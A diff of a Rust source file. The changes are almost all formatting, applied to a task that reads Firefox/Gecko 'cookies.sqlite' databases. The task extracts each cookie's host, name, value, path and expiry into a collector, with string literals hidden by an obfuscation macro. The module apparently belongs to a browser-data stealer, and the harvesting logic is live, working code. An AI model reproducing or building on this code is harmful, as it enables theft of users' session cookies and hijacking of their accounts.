@@ -1,14 +1,14 @@
 use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
-use crate::{read_and_collect_unique_records, to_string_and_write_all, Cookie, SqliteDatabase};
+use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 
 const MOZ_COOKIES_NAME: usize = 2;
 const MOZ_COOKIES_VALUE: usize = 3;
@@ -17,7 +17,7 @@ const MOZ_COOKIES_PATH: usize = 5;
 const MOZ_COOKIES_EXPIRY: usize = 6;
 
 pub(super) struct CookiesTask<'a> {
-    browser: Arc<GeckoBrowserData<'a>>
+    browser: Arc<GeckoBrowserData<'a>>,
 }
 
 impl<'a> CookiesTask<'a> {
@@ -35,9 +35,9 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
             &StorageFileSystem,
             |profile| profile / s!("cookies.sqlite"),
             s!("moz_cookies"),
-            extract_cookies_from_record
+            extract_cookies_from_record,
         ) else {
-            return
+            return;
         };
 
         collector.get_browser().increase_cookies_by(cookies.len());
@@ -49,7 +49,10 @@ fn extract_cookies_from_record<R: TableRecord>(record: &R) -> Option<Cookie> {
     let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?.to_owned();
     let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?.to_owned();
     let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?.to_owned();
-    let expires = record.get_value(MOZ_COOKIES_EXPIRY)?.as_integer()?.to_owned();
+    let expires = record
+        .get_value(MOZ_COOKIES_EXPIRY)?
+        .as_integer()?
+        .to_owned();
     let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?.to_owned();
 
     Some(Cookie {
@@ -57,6 +60,6 @@ fn extract_cookies_from_record<R: TableRecord>(record: &R) -> Option<Cookie> {
         name,
         value,
         path,
-        expires_utc: expires
+        expires_utc: expires,
     })
 }
